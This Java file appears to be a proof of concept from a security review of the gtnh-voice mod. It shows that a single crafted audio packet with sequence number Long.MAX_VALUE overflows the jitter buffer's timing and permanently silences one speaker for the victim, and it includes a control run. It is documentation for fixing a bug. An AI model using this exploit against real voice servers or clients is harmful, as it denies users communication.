package com.enn3developer.gtnhvoice.security;

import com.enn3developer.gtnhvoice.core.audio.jitter.AdaptiveJitterBuffer;

/**
 * Round-3 security review, NEW finding (sibling of #5, distinct mechanism - no thrown exception, no dead thread).
 *
 * <p>Drives the REAL victim-side {@link AdaptiveJitterBuffer} exactly the way {@code VoiceSource}'s poller thread
 * does, and reproduces its {@code lastEmittedSequence} bookkeeping verbatim (VoiceSource.java lines 252-305,
 * quoted inline below). {@code VoiceSource} cannot be linked headless (it drags in PlaybackManager -&gt; the
 * OpenAL/lwjgl3ify playback stack), so the ~30 lines of consumer glue are copied faithfully while every buffer
 * primitive (offer/poll/discardThrough/isSequenceOverdue/peek) is the genuine victim class.
 *
 * <p>Attack: {@code BaseAudioPacket.sequenceNumber} is a raw wire long, relayed verbatim by the server and (for a
 * hostile server, which controls all clientbound packets and holds the session AES key) fully attacker-chosen for
 * any sourceId. A single frame with sequenceNumber = Long.MAX_VALUE makes
 * {@code scheduledPlaybackTime = firstArrival + delay + (Long.MAX - firstSeq) * 20} overflow signed-long to a time
 * in the PAST, so the buffer reports that frame as immediately due/overdue. The poller polls it and records
 * {@code lastEmittedSequence = Long.MAX_VALUE}. From then on {@code discardThrough(Long.MAX_VALUE)} drops EVERY
 * future frame (all sequence numbers are &lt;= Long.MAX), and the inactivity reset never clears
 * {@code lastEmittedSequence} - so the victim is silently, permanently deaf to that speaker for the whole session.
 */
public final class JitterSeqPoison {

    // --- Faithful copy of VoiceSource's decode bookkeeping (VoiceSource.java 74-78) -----------------------------
    private long lastEmittedSequence = -1;
    private int consecutivePlcFrames;
    private boolean emittedSinceReset;
    private long framesEmitted;
    private long framesConcealed;
    private static final int MAX_CONSECUTIVE_PLC_FRAMES = 5;

    private final AdaptiveJitterBuffer jitterBuffer;

    private JitterSeqPoison(AdaptiveJitterBuffer buf) {
        this.jitterBuffer = buf;
    }

    // Verbatim port of VoiceSource.emitNextFrame() (lines 252-279); decode() replaced by a success counter, since
    // the deafness is in the sequence bookkeeping, not the codec. Returns whether a frame was consumed.
    private boolean emitNextFrame() {
        jitterBuffer.discardThrough(lastEmittedSequence);

        Long headSequence = jitterBuffer.peekSequenceNumber();
        if (headSequence == null) return false;

        if (headSequence > lastEmittedSequence + 1 && shouldConcealGap(headSequence)) {
            emitConcealment();
            return true;
        }

        AdaptiveJitterBuffer.Frame frame = jitterBuffer.poll();
        if (frame == null) return false;

        lastEmittedSequence = frame.sequenceNumber;
        consecutivePlcFrames = 0;
        framesEmitted++;          // stands in for a successful decoder.decode()+playbackManager.submit()
        emittedSinceReset = true;
        return true;
    }

    // Verbatim port of VoiceSource.shouldConcealGap() (lines 281-289).
    private boolean shouldConcealGap(long headSequence) {
        if (!emittedSinceReset) return false;
        if (consecutivePlcFrames >= MAX_CONSECUTIVE_PLC_FRAMES) return false;
        if (!jitterBuffer.isSequenceOverdue(lastEmittedSequence + 1)) return false;
        return !jitterBuffer.isSequenceOverdue(headSequence);
    }

    // Verbatim port of VoiceSource.emitConcealment() (lines 291-304).
    private void emitConcealment() {
        lastEmittedSequence++;
        consecutivePlcFrames++;
        framesConcealed++;
    }

    // Port of VoiceSource.checkInactivity()/runPoller() reset block (lines 137-147, 181-188): NOTE it clears the
    // decoder-reset flags but NEVER touches lastEmittedSequence - that is the persistence bug.
    private void inactivityReset() {
        jitterBuffer.clear();
        consecutivePlcFrames = 0;
        emittedSinceReset = false;
        // lastEmittedSequence deliberately NOT reset - exactly as in the real VoiceSource.
    }

    /** Drain like the poller would: keep emitting while frames are due. */
    private int drain() {
        int n = 0;
        while (emitNextFrame()) n++;
        return n;
    }

    public static void main(String[] args) {
        long[] clock = { 1_000_000L };
        AdaptiveJitterBuffer buf = new AdaptiveJitterBuffer(() -> clock[0], 1);
        JitterSeqPoison v = new JitterSeqPoison(buf);

        System.out.println("=== gtnh-voice: audio sequence-number overflow -> permanent per-speaker deafness ===");

        // 1) Normal first frame from the target speaker.
        buf.offer(1000L, new byte[] { 1 });
        clock[0] += 40L; // let its scheduled slot come due
        int a = v.drain();
        System.out.println("[1] normal frame seq=1000  -> emitted=" + a + " lastEmittedSequence=" + v.lastEmittedSequence);

        // 2) The poison frame: one attacker-chosen sequence number = Long.MAX_VALUE.
        buf.offer(Long.MAX_VALUE, new byte[] { 2 });
        clock[0] += 40L;
        Long head = buf.peekSequenceNumber();
        boolean overdue = buf.isSequenceOverdue(Long.MAX_VALUE);
        int b = v.drain();
        System.out.println("[2] poison frame seq=Long.MAX_VALUE  head=" + head
            + " isSequenceOverdue(MAX)=" + overdue + " (overflow made it 'due' in the past)");
        System.out.println("    emitted=" + b + "  lastEmittedSequence now = " + v.lastEmittedSequence
            + (v.lastEmittedSequence == Long.MAX_VALUE ? "  <-- PINNED to Long.MAX_VALUE" : ""));

        // 3) Speaker keeps talking with normal sequence numbers across several inactivity resets (pauses).
        int totalAfter = 0;
        for (int seg = 0; seg < 3; seg++) {
            v.inactivityReset();               // 250ms silence -> VoiceSource resets segment (but not lastEmittedSequence)
            long base = 2000L + seg * 100L;
            for (int i = 0; i < 20; i++) {
                buf.offer(base + i, new byte[] { 9 });
                clock[0] += 20L;
            }
            clock[0] += 100L;
            totalAfter += v.drain();
        }
        System.out.println("[3] after poison: 3 fresh segments, 60 legit frames offered -> emitted=" + totalAfter
            + "  (every frame discarded by discardThrough(Long.MAX_VALUE))");

        // 4) Control: a clean VoiceSource that never saw the poison frame plays the identical 60 frames fine.
        long[] c2 = { 1_000_000L };
        AdaptiveJitterBuffer cleanBuf = new AdaptiveJitterBuffer(() -> c2[0], 1);
        JitterSeqPoison clean = new JitterSeqPoison(cleanBuf);
        cleanBuf.offer(1000L, new byte[] { 1 });
        c2[0] += 40L;
        clean.drain();
        int cleanTotal = 0;
        for (int seg = 0; seg < 3; seg++) {
            clean.inactivityReset();
            long base = 2000L + seg * 100L;
            for (int i = 0; i < 20; i++) {
                cleanBuf.offer(base + i, new byte[] { 9 });
                c2[0] += 20L;
            }
            c2[0] += 100L;
            cleanTotal += clean.drain();
        }
        System.out.println("[4] control (no poison): same 60 legit frames -> emitted=" + cleanTotal);

        boolean proven = v.lastEmittedSequence == Long.MAX_VALUE && totalAfter == 0 && cleanTotal > 0;
        System.out.println();
        System.out.println(proven
            ? "RESULT: PROVEN - one crafted sequence number permanently deafens the victim to that speaker "
                + "(0/60 frames after, vs " + cleanTotal + "/60 for a clean source). Silent: no exception, no dead thread."
            : "RESULT: NOT reproduced (emittedAfter=" + totalAfter + ", clean=" + cleanTotal + ")");
        if (!proven) System.exit(1);
    }
}
